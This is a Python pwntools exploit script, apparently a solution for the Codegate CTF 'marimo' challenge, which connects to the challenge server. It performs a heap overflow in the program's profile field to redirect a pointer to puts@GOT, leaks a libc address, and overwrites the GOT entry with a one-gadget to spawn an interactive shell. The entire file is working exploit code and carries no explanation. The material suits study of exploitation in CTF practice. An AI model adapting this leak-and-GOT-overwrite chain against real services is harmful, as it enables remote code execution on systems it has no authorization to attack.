#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import time

host = "10.211.55.6"
port = 8888
host = "ch41l3ng3s.codegate.kr"
port = 3333

r = remote(host,port)


def sell(idx):
    r.recvuntil(">>")
    r.sendline("S")
    r.recvuntil(">>")
    r.sendline(str(idx))
    r.recvuntil("?")
    r.sendline("S")

def buy(size,name,pr):
    r.recvuntil(">>")
    r.sendline("B")
    r.recvuntil(">>")
    r.sendline(str(size))
    r.recvuntil(">>")
    r.sendline("P")
    r.recvuntil(">>")
    r.sendline(name)
    r.recvuntil(">>")
    r.sendline(pr)

def view(idx,profile=None):
    r.recvuntil(">>")
    r.sendline("V")
    r.recvuntil(">>")
    r.sendline(str(idx))
    data = r.recvuntil(">>")
    if profile :
        r.sendline("M")
        r.recvuntil(">>")
        r.sendline(profile)
        return data
    else :
        r.sendline("B")
        return data

puts_got = 0x603018
r.recvuntil(">>")

r.sendline("show me the marimo")
r.recvuntil(">>")
r.sendline("Aa")
r.recvuntil(">>")
r.sendline("orange")
time.sleep(1)
sell(0)
buy(1,"danogg","fuck")
buy(1,"orange","fuck")
time.sleep(3)
data = view(0)
ctime = int(data.split("current time :")[1].split("\n")[0].strip())
view(0,"a"*0x30 + p32(ctime) + p32(1) + p64(puts_got) + p64(puts_got))
r.recvuntil(">>")
r.sendline("B")
data = view(1)
libc = u64(data.split("name :")[1].split("\n")[0].strip().ljust(8,"\x00")) - 0x6f690
print hex(libc)
magic = libc + 0x45216
view(1,p64(magic))
r.interactive()
